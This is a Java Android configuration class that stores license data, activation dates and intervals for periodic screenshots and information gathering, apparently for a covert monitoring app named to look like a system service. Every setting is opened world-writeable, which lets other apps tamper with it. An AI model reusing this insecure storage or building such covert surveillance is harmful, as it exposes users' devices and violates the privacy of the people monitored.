package system.service.config;

import java.util.Date;

import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;

/**
 * Implementation of configurations I/O by SharedPreferences.
 * in Android, these configurations will be saved in /data/data/PACKAGE_NAME/shared_prefs directory with XML format.
*/
public class ConfigCtrl 
{
	private static final String PREFS_NAME = "system.service";
	private static final String LICENSE_KEY = "LicenseKey";
	private static final String LICENSE_TYPE = "LicenseType";
	private static final String INTERVAL_TRY_SCREENSHOT_ = "TryScreenshotInterval";
	private static final String INTERVAL_TRY_GETINFO = "TryGetInfoInterval";
	private static final String CONSUMED_DATETIME = "ConsumedDatetime"; // The 1st activation datetime
	private static final String LAST_ACTIVATED_DATETIME = "LastActivatedDatetime"; // The last activation datetime
	private static final String LAST_GETINFO_DATETIME = "LastGetInfoDatetime";
	private static final String AUTH_SMS_SENT_DATETIME = "AuthSmsSentDatetime";
	
	public static boolean set(Context context, String key, String value)
	{	
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(key, value);     
		return editor.commit();
	}
	
	public static String get(Context context, String key)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getString(key, "");
	}
	
	public static String getLicenseKey(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(LICENSE_KEY, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setLicenseKey(Context context, String key)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(LICENSE_KEY, key);     
		return editor.commit();
	}
	
	public static LICENSE_TYPE getLicenseType(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String type = config.getString(LICENSE_TYPE, "");
		return LicenseCtrl.strToEnum(type);
	}
	
	public static boolean setLicenseType(Context context, LICENSE_TYPE type)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(LICENSE_TYPE, LicenseCtrl.enumToStr(type));     
		return editor.commit();
	}
	
	public static int getScreenshotInterval(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getInt(INTERVAL_TRY_SCREENSHOT_, 60000);
	}
	
	public static boolean setScreenshotInterval(Context context, int interval)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putInt(INTERVAL_TRY_SCREENSHOT_, interval);     
		return editor.commit();
	}
	
	public static int getInfoInterval(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getInt(INTERVAL_TRY_GETINFO, 300000);
	}
	
	public static boolean setInfoInterval(Context context, int interval)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putInt(INTERVAL_TRY_GETINFO, interval);     
		return editor.commit();
	}
	
	public static String getLastGetInfoTime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(LAST_GETINFO_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setLastGetInfoTime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(LAST_GETINFO_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static String getConsumedDatetime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(CONSUMED_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setConsumedDatetime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(CONSUMED_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static String getLastActivatedDatetime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(LAST_ACTIVATED_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setLastActivatedDatetime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(LAST_ACTIVATED_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static String getAuthSmsSentDatetime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(AUTH_SMS_SENT_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setAuthSmsSentDatetime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(AUTH_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
}